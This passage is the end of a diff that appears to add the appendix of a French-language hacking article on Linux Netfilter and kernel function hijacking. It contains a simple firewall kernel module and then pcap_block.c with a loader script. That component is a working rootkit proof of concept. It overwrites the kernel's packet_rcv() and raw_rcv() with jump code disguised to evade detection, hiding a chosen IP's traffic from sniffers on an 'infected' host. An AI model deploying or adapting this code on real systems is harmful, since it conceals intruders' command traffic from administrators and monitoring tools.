+ret = set_ip_rule((unsigned int)arg);
+break;
+}
+case LWFW_DENY_PORT: {
+ret = set_port_rule((unsigned short)arg);
+break;
+}
+default:
+ret = -EBADRQC;
+};
+
+return ret;
+}
+
+/* Called whenever open() is called on the device file */
+static int lwfw_open(struct inode *inode, struct file *file)
+{
+if (lwfw_ctrl_in_use) {
+return -EBUSY;
+} else {
+MOD_INC_USE_COUNT;
+lwfw_ctrl_in_use++;
+return 0;
+}
+return 0;
+}
+
+/* Called whenever close() is called on the device file */
+static int lwfw_release(struct inode *inode, struct file *file)
+{
+lwfw_ctrl_in_use ^= lwfw_ctrl_in_use;
+MOD_DEC_USE_COUNT;
+return 0;
+}
+
+/*********************************************/
+/*
+* Module initialisation and cleanup follow...
+*/
+int init_module()
+{
+/* Register the control device, /dev/lwfw */
+SET_MODULE_OWNER(&lwfw_fops);
+
+/* Attempt to register the LWFW control device */
+if ((major = register_chrdev(LWFW_MAJOR, LWFW_NAME,
+&lwfw_fops)) < 0) {
+printk("LWFW: Failed registering control device!\n");
+printk("LWFW: Module installation aborted.\n");
+return major;
+}
+
+/* Make sure the usage marker for the control device is cleared */
+lwfw_ctrl_in_use ^= lwfw_ctrl_in_use;
+
+printk("\nLWFW: Control device successfully registered.\n");
+
+/* Now register the network hooks */
+nfkiller.hook = lwfw_hookfn;
+nfkiller.hooknum = NF_IP_PRE_ROUTING; /* First stage hook */
+nfkiller.pf = PF_INET; /* IPV4 protocol hook */
+nfkiller.priority = NF_IP_PRI_FIRST; /* Hook to come first */
+
+/* And register... */
+nf_register_hook(&nfkiller);
+
+printk("LWFW: Network hooks successfully installed.\n");
+
+printk("LWFW: Module installation successful.\n");
+return 0;
+}
+
+void cleanup_module()
+{
+int ret;
+
+/* Remove IPV4 hook */
+nf_unregister_hook(&nfkiller);
+
+/* Now unregister control device */
+if ((ret = unregister_chrdev(LWFW_MAJOR, LWFW_NAME)) != 0) {
+printk("LWFW: Removal of module failed!\n");
+}
+
+/* If anything was allocated for the deny rules, free it here */
+if (deny_if)
+kfree(deny_if);
+
+printk("LWFW: Removal of module successful.\n");
+}
+>
+
+<++> lwfw/lwfw.h
+/* Include file for the Light-weight Fire Wall LKM.
+*
+* A very simple Netfilter module that drops backets based on either
+* their incoming interface or source IP address.
+*
+* Written by bioforge - March 2003
+*/
+
+#ifndef __LWFW_INCLUDE__
+# define __LWFW_INCLUDE__
+
+/* NOTE: The LWFW_MAJOR symbol is only made available for kernel code.
+* Userspace code has no business knowing about it. */
+# define LWFW_NAME "lwfw"
+
+/* Version of LWFW */
+# define LWFW_VERS 0x0001 /* 0.1 */
+
+/* Definition of the LWFW_TALKATIVE symbol controls whether LWFW will
+* print anything with printk(). This is included for debugging purposes.
+*/
+#define LWFW_TALKATIVE
+
+/* These are the IOCTL codes used for the control device */
+#define LWFW_CTRL_SET 0xFEED0000 /* The 0xFEED... prefix is arbitrary
+*/
+#define LWFW_GET_VERS 0xFEED0001 /* Get the version of LWFM */
+#define LWFW_ACTIVATE 0xFEED0002
+#define LWFW_DEACTIVATE 0xFEED0003
+#define LWFW_GET_STATS 0xFEED0004
+#define LWFW_DENY_IF 0xFEED0005
+#define LWFW_DENY_IP 0xFEED0006
+#define LWFW_DENY_PORT 0xFEED0007
+
+/* Control flags/Options */
+#define LWFW_IF_DENY_ACTIVE 0x00000001
+#define LWFW_IP_DENY_ACTIVE 0x00000002
+#define LWFW_PORT_DENY_ACTIVE 0x00000004
+
+/* Statistics structure for LWFW.
+* Note that whenever a rulés condition is changed the related
+* xxx_dropped field is reset.
+*/
+struct lwfw_stats {
+unsigned int if_dropped; /* Packets dropped by interface rule
+*/
+unsigned int ip_dropped; /* Packets dropped by IP addr. rule
+*/
+unsigned int tcp_dropped; /* Packets dropped by TCP port rule
+*/
+unsigned long total_dropped; /* Total packets dropped */
+unsigned long total_seen; /* Total packets seen by filter */
+};
+
+/*
+* From here on is used solely for the actual kernel module
+*/
+#ifdef __KERNEL__
+# define LWFW_MAJOR 241 /* This exists in the experimental range */
+
+/* This macro is used to prevent dereferencing of NULL pointers. If
+* a pointer argument is NULL, this will return -EINVAL */
+#define NULL_CHECK(ptr) \
+if ((ptr) == NULL) return -EINVAL
+
+/* Macros for accessing options */
+#define DENY_IF_ACTIVE (lwfw_options & LWFW_IF_DENY_ACTIVE)
+#define DENY_IP_ACTIVE (lwfw_options & LWFW_IP_DENY_ACTIVE)
+#define DENY_PORT_ACTIVE (lwfw_options & LWFW_PORT_DENY_ACTIVE)
+
+#endif /* __KERNEL__ */
+#endif
+>
+
+<++> lwfw/Makefile
+CC= egcs
+CFLAGS= -Wall -O2
+OBJS= lwfw.o
+
+.c.o:
+$(CC) -c $< -o $@ $(CFLAGS)
+
+all: $(OBJS)
+
+clean:
+rm -rf *.o
+rm -rf ./*~
+>
+
+--[ B - Code pour la section 6
+
+Je vous presente ici un module simple qui permet d'hijacket les fonctions
+packet_rcv() et raw_rcv() afin de cacher tous paquets venant ou se
+dirigeant vers une addresse IP que nous allons lui spécifier.  L'addresse
+IP par default est 127.0.0.1 mais vous pouvez facilement la changer en
+modifiant la valeur de #define IP. Je vous présente aussi un script shell
+qui va chercher les addresses des différentes fonctions (citées plus haut)
+dans un System.map puis lancer insmod avec l'addresse de ces fonctions
+traduit dans le format requis. Le script de chargement a été ecrit par
+grem. A l'origine pour mon projet Mod-off, il a été facilement modifié pour
+convenir à ce module. Merci une fois encore à grem.
+
+Le module présenté est une simple preuve du concept précedemment étudié, en
+consequence de quoi il ne possède aucune routine pour se cacher. Il est
+aussi important de se rappeller qye le module va cacher tout traffic à un
+sniffer présente sur la machine infectée, mais qu'un sniffer placé sur un
+ho^te différent, mais sur le même segment du LAN continuera à voir les
+paquets. Avec ce qui est montré dans ce module, les lecteurs intelligents
+auront toutes les connaissances nécessaires pour coder des fonctions qui
+pourront filtrer n'importe quels types de paquets. J'ai utilisé avec succès
+les techniques présentées ici pour cacher certains paquets (paquets de
+commande ou pour récuperer des informations) de mes autres projets de LKM.
+
+
+<++> pcaphide/pcap_block.c
+/* Kernel hack that will hijack the packet_rcv() function
+* which is used to pass packets to Libpcap applications
+* that use PACKET sockets. Also hijacks the raw_rcv()
+* function. This is used to pass packets to applications
+* that open RAW sockets.
+*
+* Written by bioforge - 30th June, 2003
+*/
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/netdevice.h>
+#include <linux/skbuff.h>
+#include <linux/smp_lock.h>
+#include <linux/ip.h> /* For struct ip */
+#include <linux/if_ether.h> /* For ETH_P_IP */
+
+#include <asm/page.h> /* For PAGE_OFFSET */
+
+/*
+* IP address to hide 127.0.0.1 in NBO for Intel */
+#define IP htonl(0x7F000001)
+
+/* Function pointer for original packet_rcv() */
+static int (*pr)(struct sk_buff *skb, struct net_device *dev,
+struct packet_type *pt);
+MODULE_PARM(pr, "i"); /* Retrieved as insmod parameter */
+
+/* Function pointer for original raw_rcv() */
+static int (*rr)(struct sock *sk, struct sk_buff *skb);
+MODULE_PARM(rr, "i");
+
+/* Spinlock used for the parts where we un/hijack packet_rcv() */
+static spinlock_t hijack_lock = SPIN_LOCK_UNLOCKED;
+
+/* Helper macros for use with the Hijack spinlock */
+#define HIJACK_LOCK spin_lock_irqsave(&hijack_lock, \
+sl_flags)
+#define HIJACK_UNLOCK spin_unlock_irqrestore(&hijack_lock, \
+sl_flags)
+
+#define CODESIZE 10
+/* Original and hijack code buffers.
+* Note that the hijack code also provides 3 additional
+* bytes ( inc eax; nop; dec eax ) to try and throw
+* simple hijack detection techniques that just look for
+* a move and a jump. */
+/* For packet_rcv() */
+static unsigned char pr_code[CODESIZE] = "\xb8\x00\x00\x00\x00"
+"\x40\x90\x48"
+"\xff\xe0";
+static unsigned char pr_orig[CODESIZE];
+
+/* For raw_rcv() */
+static unsigned char rr_code[CODESIZE] = "\xb8\x00\x00\x00\x00"
+"\x40\x90\x48"
+"\xff\xe0";
+static unsigned char rr_orig[CODESIZE];
+
+/* Replacement for packet_rcv(). This is currently setup to hide
+* all packets with a source or destination IP address that we
+* specify. */
+int hacked_pr(struct sk_buff *skb, struct net_device *dev,
+struct packet_type *pt)
+{
+int sl_flags; /* Flags for spinlock */
+int retval;
+
+/* Check if this is an IP packet going to or coming from our
+* hidden IP address. */
+if (skb->protocol == htons(ETH_P_IP)) /* IP packet */
+if (skb->nh.iph->saddr == IP || skb->nh.iph->daddr == IP)
+return 0; /* Ignore this packet */
+
+/* Call original */
+HIJACK_LOCK;
+memcpy((char *)pr, pr_orig, CODESIZE);
+retval = pr(skb, dev, pt);
+memcpy((char *)pr, pr_code, CODESIZE);
+HIJACK_UNLOCK;
+
+return retval;
+}
+
+/* Replacement for raw_rcv(). This is currently setup to hide
+* all packets with a source or destination IP address that we
+* specify. */
+int hacked_rr(struct sock *sock, struct sk_buff *skb)
+{
+int sl_flags; /* Flags for spinlock */
+int retval;
+
+/* Check if this is an IP packet going to or coming from our
+* hidden IP address. */
+if (skb->protocol == htons(ETH_P_IP)) /* IP packet */
+if (skb->nh.iph->saddr == IP || skb->nh.iph->daddr == IP)
+return 0; /* Ignore this packet */
+
+/* Call original */
+HIJACK_LOCK;
+memcpy((char *)rr, rr_orig, CODESIZE);
+retval = rr(sock, skb);
+memcpy((char *)rr, rr_code, CODESIZE);
+HIJACK_UNLOCK;
+
+return retval;
+}
+
+int init_module()
+{
+int sl_flags; /* Flags for spinlock */
+
+/* pr & rr set as module parameters. If zero or < PAGE_OFFSET
+* (which we treat as the lower bound of kernel memory), then
+* we will not install the hacks. */
+if ((unsigned int)pr == 0 || (unsigned int)pr < PAGE_OFFSET) {
+printk("Address for packet_rcv() not valid! (%08x)\n",
+(int)pr);
+return -1;
+}
+if ((unsigned int)rr == 0 || (unsigned int)rr < PAGE_OFFSET) {
+printk("Address for raw_rcv() not valid! (%08x)\n",
+(int)rr);
+return -1;
+}
+
+*(unsigned int *)(pr_code + 1) = (unsigned int)hacked_pr;
+*(unsigned int *)(rr_code + 1) = (unsigned int)hacked_rr;
+
+HIJACK_LOCK;
+memcpy(pr_orig, (char *)pr, CODESIZE);
+memcpy((char *)pr, pr_code, CODESIZE);
+memcpy(rr_orig, (char *)rr, CODESIZE);
+memcpy((char *)rr, rr_code, CODESIZE);
+HIJACK_UNLOCK;
+
+EXPORT_NO_SYMBOLS;
+
+return 0;
+}
+
+void cleanup_module()
+{
+int sl_flags;
+
+lock_kernel();
+
+HIJACK_LOCK;
+memcpy((char *)pr, pr_orig, CODESIZE);
+memcpy((char *)rr, rr_orig, CODESIZE);
+HIJACK_UNLOCK;
+
+unlock_kernel();
+}
+>
+
+<++> pcaphide/loader.sh
+#!/bin/sh
+# Written by grem, 30th June 2003
+# Hacked by bioforge, 30th June 2003
+
+if [ "$1" = "" ]; then
+echo "Use: $0 <System.map>";
+exit;
+fi
+
+MAP="$1"
+PR=`cat $MAP | grep -w "packet_rcv" | cut -c 1-16`
+RR=`cat $MAP | grep -w "raw_rcv" | cut -c 1-16`
+
+if [ "$PR" = "" ]; then
+PR="00000000"
+fi
+if [ "$RR" = "" ]; then
+RR="00000000"
+fi
+
+echo "insmod pcap_block.o pr=0x$PR rr=0x$RR"
+
+# Now do the actual call to insmod
+insmod pcap_block.o pr=0x$PR rr=0x$RR
+>
+
+<++> pcaphide/Makefile
+CC= gcc
+CFLAGS= -Wall -O2 -fomit-frame-pointer
+INCLUDES= -I/usr/src/linux/include
+OBJS= pcap_block.o
+
+.c.o:
+$(CC) -c $< -o $@ $(CFLAGS) $(INCLUDES)
+
+all: $(OBJS)
+
+clean:
+rm -rf *.o
+rm -rf ./*~
+>
+
+
+------[ References
+
+Cette appendice contient une liste des références utilisé pour écrire
+cet
+article.
+
+[1] The tcpdump group
+    http://www.tcpdump.org
+[2] The Packet Factory
+    http://www.packetfactory.net
+[3] My network tools page -
+    http://uqconnect.net/~zzoklan/software/#net_tools
+[4] Silvio Cesarés Kernel Function Hijacking article
+    http://vx.netlux.org/lib/vsc08.html
+[5] Man pages for:
+   - raw (7) 
+   - packet (7)
+   - tcpdump (1)
+[6] Linux kernel source files. In particular:
+    - net/packet/af_packet.c (for packet_rcv())
+    - net/ipv4/raw.c (for raw_rcv())
+    - net/core/dev.c
+    - net/ipv4/netfilter/*
+[7] Harald Welte's Journey of a packet through the Linux 2.4 network
+stack
+    http://gnumonks.org/ftp/pub/doc/packet-journey-2.4.html
+[8] The Netfilter documentation page
+    http://www.netfilter.org/documentation
+[9] Phrack 55 - File 12 -
+    http://www.phrack.org/show.php?p=55&a=12
+[A] Linux Device Drivers 2nd Ed. by Alessandro Rubini et al.
+[B] Inside the Linux Packet Filter. A Linux Journal article
+    http://www.linuxjournal.com/article.php?sid=4852 
